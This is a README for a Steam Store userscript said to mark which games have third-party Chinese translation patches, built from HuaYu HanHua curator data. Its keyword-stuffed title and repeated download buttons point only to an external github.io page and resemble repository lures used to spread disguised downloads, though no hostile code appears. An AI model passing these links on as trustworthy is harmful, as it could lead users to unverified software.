# SteamChineseChecker v2026 - Game Script Utility 2026

> A Steam Store userscript that indicates whether a game has a third-party Chinese patch, based on curator data collected for localization review.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Steam%20Store-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lucasx35/steamchinesechecker-update-script?style=flat-square)](https://github.com/lucasx35/steamchinesechecker-update-script)

---

<p align="center">
  <a href="https://lucasx35.github.io/steamchinesechecker-update-script/">
    <img src="https://img.shields.io/badge/Download-SteamChineseChecker%20Script-brightgreen?style=for-the-badge" alt="Download SteamChineseChecker Script">
  </a>
</p>

> **[Direct Download - SteamChineseChecker](https://lucasx35.github.io/steamchinesechecker-update-script/)**

---

[Download Latest Build](https://lucasx35.github.io/steamchinesechecker-update-script/)

---

## What It Does

SteamChineseChecker is a browser userscript built for Steam Store pages. It places a clear on-page marker so you can see at a glance whether a game has a third-party Chinese patch, without leaving the store listing to check elsewhere.

The script is driven by curator data gathered from Steam curator HuaYu HanHua and is intended for localization lookup rather than gameplay modification. Its purpose is to surface patch availability right where you browse, while dataset updates are managed through the repository's workflow.

---

## Key Capabilities

- Displays Chinese patch status on Steam Store game pages
- Uses patch data sourced from the HuaYu HanHua curator dataset
- Is focused on third-party Chinese translation patch availability
- Works directly inside the Steam Store browsing experience
- Relies on a generated `data.json` file for lookup information
- Updates dataset content through weekly GitHub Actions runs
- Helps users quickly check game localization details

---

## Installation and Use

1. Download the latest build from the project page.
2. Add the userscript to the userscript manager you use.
3. Open a Steam Store game page and let the script render its status indicator.

Typical usage:

- Open a Steam Store listing
- Install or enable the userscript
- Reload the page
- Review the shown Chinese patch status

If the repository provides a packaged `data.json`, keep that file alongside the script files so the lookup data remains accessible.

---

## Configuration

Depending on your userscript manager, you may be able to change how the script loads or how updates are handled.

| Setting | Purpose | Typical Value |
| --- | --- | --- |
| `data.json` path | Location of patch lookup data | repository asset or bundled file |
| Page match | Steam Store pages the script runs on | game store listings |
| Refresh cycle | How often dataset updates are produced | weekly via GitHub Actions |

Example configuration shape:

    {
      "enabled": true,
      "dataSource": "data.json",
      "steamPagesOnly": true
    }

---

## Compatibility Notes

SteamChineseChecker is designed for Steam Store pages and depends on the layout of Steam listing pages to show its information.

- Target platform: Steam Store
- Content focus: game pages with Chinese patch lookup data
- Data source: curator-backed records from HuaYu HanHua
- Limitation: results depend on the current dataset and update schedule
- Limitation: the script is not a general-purpose localization mod for installed games

If Steam adjusts page structure or the placement of metadata, the display logic may need to be updated.

---

## Common Questions

### How do I install it?
Import the userscript into your preferred browser script manager, then open a Steam Store game page.

### How are the patch results updated?
The repository creates `data.json` automatically with GitHub Actions on a weekly schedule.

### Can I customize what gets shown?
You can change local script settings if your userscript manager or build process supports configuration updates.

### Does it work on every Steam page?
It is intended for Steam Store game pages, not for every section of the Steam site.

### Where does the data come from?
The script uses curator-collected information associated with HuaYu HanHua.

### Can I store the files elsewhere?
Yes, provided the script can reach its data file and your userscript manager can load it correctly.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
